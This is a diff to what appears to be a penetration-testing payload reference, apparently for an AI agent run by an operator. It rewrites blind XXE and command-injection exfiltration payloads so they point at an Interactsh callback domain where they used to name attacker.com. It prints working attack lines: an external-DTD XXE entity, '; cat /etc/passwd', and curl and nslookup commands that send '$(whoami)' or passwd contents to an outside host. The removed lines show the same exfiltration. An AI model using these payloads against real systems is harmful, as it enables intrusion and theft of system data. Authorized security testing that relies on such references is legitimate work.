@@ -412,10 +412,11 @@ ${{7*7}}
 <root>&xxe;</root>
 ```
 
-**Blind XXE (OOB):**
+**Blind XXE (OOB via Interactsh DEFAULT):**
 ```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your-interactsh-domain>/xxe.dtd">%xxe;]>
 ```
+(Burp Collaborator only on explicit operator mention.)
 
 **SVG XXE:**
 ```xml
@@ -458,11 +459,14 @@ $( ls )
 & sleep 5 &
 ```
 
-**Data exfiltration:**
+**Data exfiltration (blind → OOB via Interactsh DEFAULT):**
 ```
 ; cat /etc/passwd
-| curl attacker.com?data=$(cat /etc/passwd)
+| nslookup $(whoami).<your-interactsh-domain>
+| curl <your-interactsh-domain>/$(whoami)
 ```
+Get the domain first: `attack_script oob_interactsh new`. Read hits: `attack_script oob_interactsh poll --state <DIR>`.
+Burp Collaborator ONLY when the operator explicitly names it — never default.
 
 **Testing approach:**
 1. Identify parameters passed to system commands
